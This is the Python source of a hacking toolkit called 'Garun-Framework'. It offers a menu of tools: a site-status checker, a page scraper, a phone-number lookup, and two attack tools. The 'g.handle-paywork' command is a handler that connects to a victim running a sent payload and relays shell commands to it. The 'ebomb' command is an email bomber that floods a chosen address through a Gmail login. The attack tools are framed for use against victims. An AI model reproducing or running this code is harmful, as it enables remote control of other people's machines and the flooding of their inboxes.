import requests
import sys
import socket, subprocess
from termcolor import colored
import pyfiglet
import smtplib
import time
import os

import phonenumbers
from phonenumbers import geocoder, carrier, timezone

from bs4 import BeautifulSoup


os.system('clear')
# ========[Garun-Framework]=======#

# Creator : Anonymous
# email-me: goncertking@gmail.com
# github : https://github.com/Recons7

# ========[Garun-Framework]=======#

figlet_art = pyfiglet.figlet_format("Garun")
print(figlet_art)

print(colored('''
   
      /     \  __  /    ------
     / /     \(  )/    -----
    //////   ' \/ `   ---
   //// / // :    : ---
  // /   /  /`    '--
 //          //..\\
========UU====Garun==UU========
            '//||\\`
              ''``
     ''',"red"))
print(colored("\t\t     D3V3LOPED BY ANON","green"))
time.sleep(0.1)
print(colored("\n\n\t>> Type help to See for available options <<", "yellow"))
info_text_for_usage = colored("""\n\nWelcome To Garun-Framework. To use this tool commands are listed Here : 

\nCommands !!!

{ Type: [restart] To restart garun-Framework. }

 \n{Type: [./site.gframe] To access, Is Site Down Script}

\n{ Type: [./g-scrap] To acess Site Scrapper.}

\n{ Type: [g.handle-paywork] To handle a payload session if sent payload to victim.}

\n{ Type: [scrapnum] To know a brief info about a phone number.}

\n{ Type: [clr] To clear the Screen. }

\n{ Type: [ebomb] To access Email-Bomber. }

\n{ Type:[exit] To exit framework }""", "blue")




def choose_option():
	__commands__ = input("\n\n\n\n>>> ").lower()
	
		
	if "help" in __commands__:
			for _commands_ in info_text_for_usage:
				sys.stdout.write(_commands_)
				sys.stdout.flush()
				time.sleep(0.01)
				
	elif "exit" in __commands__:
		sys.exit()
		
	elif "start-gframe" in __commands__:
		print(colored("\nGarun-Framework Already Started Just type listed Commands Above To use them : ","yellow"))
	elif "./site.gframe" in __commands__:
		get_url = input("\nEnter a URL to check : ")
		__checking__ = requests.get(get_url)
		site_status = __checking__.status_code
		if site_status == 200:
			print(colored("\nSite is Up And Working Fine ✓","green"))
			
		elif site_status == 503:
			print(colored("Service Unavailable. This could be due to temporarily overloading the server or maintenance of the server.", "red"))
			
	elif "clr" in __commands__:
		os.system('clear')
	elif "restart" in __commands__:
		print(colored("\n\nRestarting Garun-Framework..... ", "green"))
		os.system('exit()')
		os.system('python3 Garun-Framework.py')
		
	elif "./g-scrap" in __commands__:
		
		f_load = colored("\n\n\tLoading Html Content......", "yellow")
		
		URL = input("\n\nEnter Url you want to scrap : ")
		
		for text in f_load:
			sys.stdout.write(text)
			sys.stdout.flush()
			time.sleep(0.1)
			
			
		page = requests.get(URL)
			
			
		data = colored(f"\n\n\n{page.text}", "green")
		
		for html in data:
			sys.stdout.write(html)
			sys.stdout.flush()
			time.sleep(0.000000001)
			
		info_text = "\n\n\nFetching All Text.....\n\n\n"
		
		for text in info_text:
			sys.stdout.write(text)
			sys.stdout.flush()
			time.sleep(0.1)
		
		page = requests.get(URL)
		
		soup = BeautifulSoup(page.content, "html.parser")
		
		print(soup.get_text())
		
		print("\n\n\n")	
		
			
	elif "g.handle-paywork" in __commands__ :
		
		print(colored("\nYou Have to send payload to victim first to use this handler\n", "yellow"))
		print(colored("Payload is included in Garun-Framework's Directory, send that payload.py to victim.", "yellow"))
		ip = input("\n\nEnter ip address : ")
		port = int(input("\nEnter port number :  "))
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((ip,port))
			cmdlet = input("$")
			while cmdlet!='quit':
				s.send(cmdlet.encode())
				result = s.recv(2048).decode()
				print(result)
				cmdlet = input("$ ")
			s.close()
		except:
			print("\nsomething error has occurred")
	elif 'ebomb' in __commands__:
		os.system('clear')
		ascii_art = print(colored('''
     _____                                        
  __|___  |__  ______  _____  ____    __  ______  
 |   ___|    ||      >/     \|    \  /  ||      > 
 |   ___|    ||     < |     ||     \/   ||     <  
 |______|  __||______>\_____/|__/\__/|__||______> 
    |_____|                                       
                                                  
''',"red"))
		mail = input("\nEnter Your Email : ")
		print(colored("\nTo use this Bomber Enable less app secure in gmail settings...\n", "yellow"))
		pwd = input("Enter Your Email password : ")
		print("\n")
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()
		server.login(mail, pwd)
		def mail_bomber():
			
			mail_2 = input(colored("Enter email you want to bomb : ","cyan"))
			print("\n")
			msg = input(colored("Enter a message for bombing : ","yellow"))
			print("\n")
			much = int(input(colored("Enter number of bombs : ","red")))
			animation = "|/-\\"
			print("\n")
			print(colored("==========================Bombing==========================","yellow"))
			print("\n")
			for i in range(1,much+1):
				time.sleep(0.0001)
				sys.stdout.write("\r" + animation[i %
				len(animation)])
				sys.stdout.flush()
				print(i," \nPlease wait Bombing : ", mail_2)
				print("\n")
				server.sendmail(mail, mail_2, msg)
				print("\n")
				print("Bombed Succesfully !")
				time.sleep(0.01)
				os.system('clear')
			mail_bomber()
		mail_bomber()
		
	elif "scrapnum" in __commands__:
		
		phone_num = input("\n\nEnter phone number with (+(code)) : ")
		gnumber = phonenumbers.parse(phone_num, "CH")
		time.sleep(0.1)
		print("\n\nCountry Is : ", geocoder.description_for_number(gnumber, "en"))
		ch_num = phonenumbers.parse(phone_num, "RO")
		time.sleep(0.1)

		print("\n\nISP Is : ", carrier.name_for_number(gnumber, "en"))
	
		num_timezone = phonenumbers.parse(phone_num)
		time.sleep(0.1)
	
		print("\n\nTime Zone : ", timezone.time_zones_for_number(gnumber))
	
		ask = input("\n\nDo you Want to Extract a number from given Source ? (Y/N) : ")
		if ask == "Y" or ask == "y":
			text = input("\n\nEnter the full text from where you want to exract phonenumber : ")
		code = input("\n\nEnter country in Short for country number you are searching for eg.(IN) : ")
		
		try:
			numbers = phonenumbers.PhoneNumberMatcher(text, code) 
			for hnumber in numbers:
				print("\n\n", "Number is : ", hnumber)
				time.sleep(0.1)
				
		except Exception as e:
			time.sleep(0.1)
			print(colored("\n\nUnable to fetch Info !", "red"))
		else:
			pass
		phone_number = phonenumbers.parse(phone_num)
		valid = phonenumbers.is_valid_number(phone_number) 
		possible = phonenumbers.is_possible_number(phone_number)
		time.sleep(0.1)
		print( "\n\nChecking Wether Number is Valid or not ! : ") 
		is_valid = valid
		if is_valid == True:
			time.sleep(0.1)
			print(colored("\n\nPhone Number Is Valid !", "green"))
		elif is_valid == False:
			time.sleep(0.1)
			print("\n\nPhone Number is not a Valid Number !")
		else:
			time.sleep(0.1)
			print("\n\nUnable to fetch info !")
		time.sleep(0.1)
			
		print(colored("\n\nChecking wether Number is possible or not ! : ", "yellow"))
		is_possible = possible

		if is_possible == True:
			time.sleep(0.1)
			print(colored("\n\nNumber is Possible...", "green"))
		elif is_possible == False:
			time.sleep(0.1)
			print(colored("\n\nNumber dosent seems to be a possible number !", "red"))
		else:
			time.sleep(0.1)
			print(colored("\n\nUnable to fetch info !", "red"))
	
	else:
		print(colored("\n\n\nInvaild Command Type correct Command.\n", "red"))


	choose_option()
choose_option()
	

